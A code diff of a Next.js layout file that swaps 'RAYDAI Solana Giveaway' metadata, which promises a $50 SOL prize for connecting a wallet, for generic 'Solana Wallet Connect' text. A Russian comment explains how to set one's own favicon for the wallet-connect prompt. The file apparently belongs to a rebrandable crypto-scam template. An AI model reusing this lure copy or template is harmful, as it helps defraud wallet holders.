@@ -1,36 +1,18 @@
 import type React from "react"
 import type { Metadata } from "next"
-import { Inter } from "next/font/google"
+import { Geist, Geist_Mono } from "next/font/google"
 import "./globals.css"
 
-const inter = Inter({ subsets: ["latin"] })
+const _geist = Geist({ subsets: ["latin"] })
+const _geistMono = Geist_Mono({ subsets: ["latin"] })
 
 export const metadata: Metadata = {
-  title: "RAYDAI Solana Giveaway",
-  description: "Join RAYDAI AI Staking Platform. Connect your wallet to enter our exclusive $50 SOL giveaway. Premium GPU computing and massive rewards await!",
+  title: "Solana Wallet Connect",
+  description: "Connect your Solana wallet",
   icons: {
     icon: "/favicon.ico",
-  },
-  keywords: "RAYDAI, raydai token, AI staking, GPU computing, SOL giveaway, $50 SOL, cryptocurrency, AI mining",
-  authors: [{ name: "RAYDAI Team" }],
-  openGraph: {
-    title: "RAYDAI Solana Giveaway | AI Staking Platform",
-    description: "Connect your wallet to RAYDAI and enter to win instant Solana. Join our premium AI staking and GPU computing platform today!",
-    type: "website",
-    url: "https://raydai.com",
-    images: ["/preview.png"],
-  },
-  twitter: {
-    card: "summary_large_image",
-    title: "RAYDAI Solana Giveaway",
-    description: "Connect wallet to enter Solana giveaway. Premium AI staking platform with GPU computing rewards.",
-    images: ["/preview.png"],
-  },
-  robots: {
-    index: true,
-    follow: true,
-  },
-  viewport: "width=device-width, initial-scale=1, maximum-scale=1",
+  },//ТУТ КОРОЧЕ УКАЖЕШЬ ФАВИКОНКУ СВОЮ ОНА БУДЕТ ОТОБРАЖАТЬСЯ ПРИ ПОДКЛЮЧЕНИИ КОШЕЛЬКА МОЖЕШЬ ИСПОЛЬЗОВАТЬ ВАЩЕ ЛЮБЫЕ ФОРМАТЫ ICO PNG JPG JPEG
+    generator: 'solanaapp'
 }
 
 export default function RootLayout({
@@ -39,13 +21,8 @@ export default function RootLayout({
   children: React.ReactNode
 }>) {
   return (
-    <html lang="en" className={inter.className}>
-      <head>
-        <link rel="preconnect" href="https://fonts.googleapis.com" />
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
-        <meta name="theme-color" content="#8B5CF6" />
-      </head>
-      <body className="antialiased bg-gray-950">{children}</body>
+    <html lang="en">
+      <body className={`font-sans antialiased`}>{children}</body>
     </html>
   )
 }
